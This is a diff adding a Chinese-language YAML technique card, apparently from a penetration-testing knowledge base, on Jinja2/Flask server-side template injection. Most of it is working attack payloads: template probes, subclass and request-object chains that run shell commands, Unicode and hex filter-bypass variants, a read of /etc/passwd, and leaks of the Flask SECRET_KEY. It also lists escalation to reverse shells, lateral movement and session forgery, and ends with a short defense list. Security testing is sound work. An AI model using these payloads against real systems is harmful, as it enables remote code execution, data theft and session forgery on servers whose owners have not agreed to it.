@@ -1,0 +1,90 @@
+# 技术卡片: SSTI - Jinja2/Python RCE
+# 分类: ssti / python
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-SSTI-01 / PayloadsAllTheThings
+
+id: "ssti-jinja2-rce"
+name: "SSTI Jinja2 Python RCE"
+category: "ssti"
+subcategory: "python-jinja2"
+severity: "critical"
+
+description: |
+  Flask/Jinja2 应用将用户输入拼入 render_template_string()。
+  通过 {{}} 访问 Python 对象链：__class__ → __mro__ → __subclasses__()
+  定位 subprocess.Popen 或 os.system 实现 RCE。
+
+trigger_signals:
+  - "{{7*7}} 返回 49 或 49 出现在页面中"
+  - "Flask/Jinja2 应用"
+  - "用户输入出现在模板中且未转义"
+  - "URL 参数在错误页面中以模板变量回显"
+
+detection:
+  probe:
+    - "{{7*7}}  # 数学表达式"
+    - "{{config}}  # Flask 配置泄露"
+    - "{{'a'.__class__}}  # 对象类型泄露"
+    - "${7*7}  # 排除 FreeMarker"
+    - "<%= 7*7 %>  # 排除 ERB"
+
+payloads:
+  basic_rce:
+    - basic_rce: >
+        {{''.__class__.__mro__[1].__subclasses__()}}
+      note: "列出所有子类，定位 subprocess.Popen 索引 X"
+    - basic_rce_exec: >
+        {{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}
+      note: "X 替换为 subprocess.Popen 的实际索引"
+
+  flask_specific:
+    - config_items: "{{config.items()}}"
+      note: "泄露 Flask 配置（SECRET_KEY 等）"
+    - flask_object_chain: >
+        {{request.application.__self__._get_data_for_json.__globals__['json'].JSONEncoder.default.__globals__['os'].popen('id').read()}}
+      note: "通过 Flask request 对象链执行命令"
+
+  unicode_bypass:
+    - unicode_globals: >
+        {{lipsum|attr('\u005f\u005fglobals\u005f\u005f')}}
+      note: "Unicode 编码绕过 . 和 __ 过滤"
+    - hex_globals: >
+        {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')}}
+      note: "十六进制编码绕过"
+
+  sandbox_escape:
+    - subclasses: >
+        {{''.__class__.__bases__[0].__subclasses__()}}
+      note: "通过 __bases__ 替代 __mro__"
+    - file_read: >
+        {{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}
+      note: "通过 Flask 内置函数访问 builtins"
+
+success_indicators:
+  - "{{7*7}} 返回 49"
+  - "命令执行回显（whoami/id 输出）"
+  - "Flask config 泄露 SECRET_KEY"
+  - "OOB callback 确认 RCE"
+
+prerequisites:
+  - "Flask/Jinja2 应用"
+  - "用户输入拼接进 render_template_string()"
+  - "未使用 Jinja2 SandboxedEnvironment"
+
+upgrade_paths:
+  - "文件读取 → 源码审计 → 更多漏洞"
+  - "反弹 shell → 内网横向移动"
+  - "Flask SECRET_KEY → session 伪造"
+
+defense:
+  - "禁止 render_template_string() 拼接用户输入"
+  - "使用 Jinja2 SandboxedEnvironment"
+  - "转义 {{ }} {% %} 模板语法字符"
+  - "最小权限运行（容器/沙箱）"
+
+sources:
+  - kb: "KB-SSTI-01"
+  - ref: "PayloadsAllTheThings: SSTI"
+  - ref: "PortSwigger: SSTI"
+  - ref: "CWE-94"
